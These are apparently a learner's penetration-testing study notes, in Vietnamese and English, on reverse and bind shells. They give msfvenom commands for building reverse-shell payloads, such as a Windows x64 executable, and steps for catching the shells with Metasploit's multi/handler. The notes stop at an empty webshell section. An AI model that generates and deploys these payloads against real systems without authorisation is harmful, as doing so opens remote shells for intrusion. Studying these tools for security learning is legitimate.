# 1. Introduction
- Khi tấn công các remote system, force application running on the server (như webserver) để thực thi code. Dùng initial access to obtain shell running on the target.
  + Reverse shell: bắt remote server gửi CLI để truy cập server
  + Bind shell: mở port trên server để ta kết nối để thực thi command.

# 2. Tool
- Có netcat, socat, nhưng ở đây tập trung metasploit.
  + `exploit/multi/handler`: nhận reverse shell, tương tác với meterpreter shell.
  + msfvenom: generate payload

# 3. Type of shell
- **Reverse shell**: target bị bắt execute code để connect về máy mình. Trên máy mình sẽ dùng metasploit để set up *listener* để nhận kết nối. => Outbound dễ qua firewall hơn.
- **Bind shell**: code được execute trên target để tạo listener. Mình connect tới target qua port mà code đã mở để thực thi RCE. => inbound, có thể bị chặn bởi firewall.

# 4. msfvenom
- msfvenom dùng để generate code cho revserse shell và bind shell cơ bản.
- Syntax: `msfvenom -p <PAYLOAD> <OPTIONS>`
- Ví dụ generate Window x64 reverse shell, dùng lệnh: `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
  + `-f`: format (exe, aspx, war, py...)
  + `-o`: output file
  + `LHOST=<IP>`: IP máy mình để nhận kết nối (reverse shell)
  + `LPORT=<port>`: port máy mình để nhận connect, chưa có chương trình nào dùng port đó.
___

**Staged và Stateless**
- **Staged**: có stager (nhỏ, khó bị AV phát hiện) chạy trước => tải payload lớn sau.
- **Stateless**: 1 file duy nhất.
___

**Meterpreter** shell: nào sài rồi học
___

**Payload naming conventions**
- `<OS>/<arch>/<payload>`
- Ví dụ: `linux/x86/shell_reverse_tcp` (generate stateless reverse shell cho x86 linux target)

- Stagedless payload: dấu gạch dưới `_` (shell_reverse_tcp)
- Staged payload: dấu gạch chéo `/` (shell/reverse_tcp)

- Trang hướng dẫn: `msfvenom --list payloads`: liệt kê toàn bộ payload có sẵn, kết hợp grep cho nhanh

# 5. Metasploit multi/handler
- Để bắt reverse shell. Cần khi muốn dùng Meterpreter shell và staged payload.
- Cách dùng:
  + B1: Mở metasploit: `sudo msfconsole -q`
  + B2: gõ `use multi/handler` nhấn enter
  + B3: set options: gõ `options`
    + payload: `set PAYLOAD <payload>`
    + LHOST: `set LHOST <listen-address>`
    + LPORT: `set LPORT <listen-port>`
  + B4: gõ `exploit -j`, running a job in background. (Muốn tương tác, gõ `sessions 1`
- Muốn dùng các sessions khác, syntax: `sessions <number>`

# 6. Webshell
